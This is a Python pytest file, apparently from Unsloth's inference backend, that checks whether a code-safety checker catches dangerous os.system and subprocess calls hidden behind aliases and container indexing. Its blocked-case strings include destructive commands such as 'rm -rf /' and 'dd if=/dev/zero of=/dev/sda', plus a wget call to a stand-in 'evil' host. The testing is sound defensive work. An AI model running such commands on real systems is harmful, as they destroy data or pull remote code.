# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved.

"""Stage 4: pragmatic single-assignment / inline-container sink aliasing."""

import sys
from pathlib import Path

import pytest

_BACKEND_ROOT = Path(__file__).resolve().parents[1]
if str(_BACKEND_ROOT) not in sys.path:
    sys.path.insert(0, str(_BACKEND_ROOT))

from core.inference.tools import _check_code_safety


def _blocked(code):
    assert _check_code_safety(code) is not None, code


def _ok(code):
    assert _check_code_safety(code) is None, code


class TestAliasedSinkBlocked:
    @pytest.mark.parametrize(
        "code",
        [
            'import os\ns = os.system\ns("rm -rf /")',
            'import os\ns = os.system\ns("dd if=/dev/zero of=/dev/sda")',
            'from os import system as z\nz("rm -rf ~")',
            'import os\n[os.system][0]("rm -rf /")',
            'import os\n(os.system,)[0]("rm -rf /")',
            'import os\n{"k": os.system}["k"]("rm -rf /")',
            'import subprocess\np = subprocess.getoutput\np("wget http://evil -O -")',
        ],
    )
    def test_block(self, code):
        _blocked(code)


class TestAliasingLowFalsePositive:
    def test_reassigned_alias_not_treated_as_sink(self):
        # s is stored twice -> ambiguous -> NOT aliased. The literal arg is benign
        # anyway, so this must stay allowed (no flow-insensitive union).
        _ok('import os\ns = os.system\ns = print\ns("hi")')

    def test_alias_with_safe_command_allowed(self):
        _ok('import os\ns = os.system\ns("echo done")')

    def test_container_with_safe_command_allowed(self):
        _ok('import os\n[os.system][0]("echo hi")')

    def test_plain_local_alias_allowed(self):
        _ok("f = sorted\nf([3, 1, 2])")
